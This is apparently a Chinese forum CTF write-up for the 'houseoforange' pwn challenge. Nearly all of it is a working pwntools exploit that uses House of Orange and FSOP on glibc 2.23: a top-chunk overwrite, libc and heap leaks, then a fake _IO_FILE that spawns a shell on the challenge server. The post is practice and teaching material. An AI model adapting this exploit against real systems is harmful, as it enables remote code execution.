
模板题还写啥思路.......

~~学了fsop和house of orange 还不会可以remake了~~

## exp

```
from pwn import *
context.log_level = 'debug'
##r=process('./orange')
r = remote('node4.buuoj.cn', 26752)
libc = ELF('./libc-2.23.so')

def z():
    gdb.attach(r)

def cho(num):
    r.sendlineafter("Your choice : ", str(num))

def add(size, con):
    cho(1)
    r.sendlineafter('Length of name :', str(size))
    r.sendlineafter('Name :', con)
    r.sendlineafter('Price of Orange:', '1')
    r.sendlineafter('Color of Orange:', '1')

def edit(size, con):
    cho(3)
    r.sendlineafter("Length of name :", str(size))
    r.sendlineafter("Name:", con)
    r.sendlineafter("Price of Orange: ", '1')
    r.sendlineafter("Color of Orange: ", '1')

def show():
    cho(2)

##free_top_chunk
add(0x30, 'nameless')
pd = 'a'*0x30 + p64(0) + p64(0x21) + 'a'*16 + p64(0) + p64(0xf80)
edit(len(pd)+1, pd)
add(0x1000, 'nameless')

##leak_libc
add(0x400, 'nameles')
show()
r.recvuntil("Name of house : ")
r.recvuntil('nameles\n')
libcbase = u64(r.recv(6).ljust(8, '\x00')) - 0x3a4948 - (libc.sym['__libc_start_main'] + 240)

##set lib_functions
_IO_list_all = libcbase + libc.sym['_IO_list_all']
system = libcbase + libc.sym['system']

##leak_heap
edit(0x400, 'nameless' + 'nameles')
show()
r.recvuntil("Name of house : ")
r.recvuntil('nameles\n')
heap = u64(r.recv(6).ljust(8, '\x00')) - 0xe0
log.success('libcbase:' + hex(libcbase))
log.success('heap:' + hex(heap))

##fsop
pd = 'a'*0x400
pd += p64(0) + p64(0x21) + p64(0x0000001f00000001) + p64(0)
fake_io = '/bin/sh\x00' + p64(0x60) + p64(0) + p64(_IO_list_all - 0x10)
fake_io += p64(0) + p64(1)
fake_io = fake_io.ljust(0xc0, '\x00')
pd += fake_io
pd += p64(0)*3
pd += p64(heap + 0x5e8)
pd += p64(0)*2 + p64(system)
edit(0x800, pd)
##z()
cho(1)
r.interactive()
```

## 参考文献

[fmyy师傅的博客](<https://bbs.kanxue.com/elink@279K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6X3L8i4W2&6i4K6u0W2M7s2u0G2i4K6u0r3x3U0l9J5x3q4)9J5c8U0p5H3i4K6u0r3x3U0k6Q4x3V1k6o6L8$3#2H3k6i4c8A6N6r3W2G2L8W2)9J5c8V1u0&6N6r3g2o6g2p5k6Q4x3X3b7J5x3o6t1H3i4K6u0r3>)

[IO-file的详解](<https://bbs.kanxue.com/elink@755K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6J5j5i4W2Q4x3X3c8U0M7q4)9J5k6h3N6A6N6r3S2#2j5W2)9J5k6h3W2G2i4K6u0r3j5i4u0U0K9r3W2$3k6i4u0K6i4K6u0r3d9f1!0Q4y4h3k6r3d9f1I4q4i4K6g2X3N6Y4c8S2j5X3I4W2i4K6g2X3K9r3q4B7j5h3y4C8i4K6g2X3j5h3&6V1i4K6g2X3k6Y4y4G2M7q4)9J5x3%4k6@1j5h3u0D9k6g2)9J5y4f1f1#2i4K6t1#2z5p5q4Q4x3U0g2m8b7W2)9J5y4f1f1$3i4K6t1#2z5p5y4Q4x3U0f1^5x3b7>).

[大师傅的FSOP利用](<https://bbs.kanxue.com/elink@6e7K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5x3h3&6Y4i4K6u0W2N6r3!0H3i4K6u0r3x3U0l9J5x3g2)9J5c8U0p5H3i4K6u0r3x3U0S2Q4x3V1k6H3N6$3&6Q4x3X3c8G2M7Y4N6Q4x3U0g2q4y4W2)9J5y4e0R3H3i4K6t1#2b7V1u0Q4x3U0g2q4y4#2)9J5y4f1u0n7i4K6t1#2z5e0y4Q4x3V1j5>).

[\[招生\]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于 2022-4-26 11:17 被Nameless_a编辑，原因：
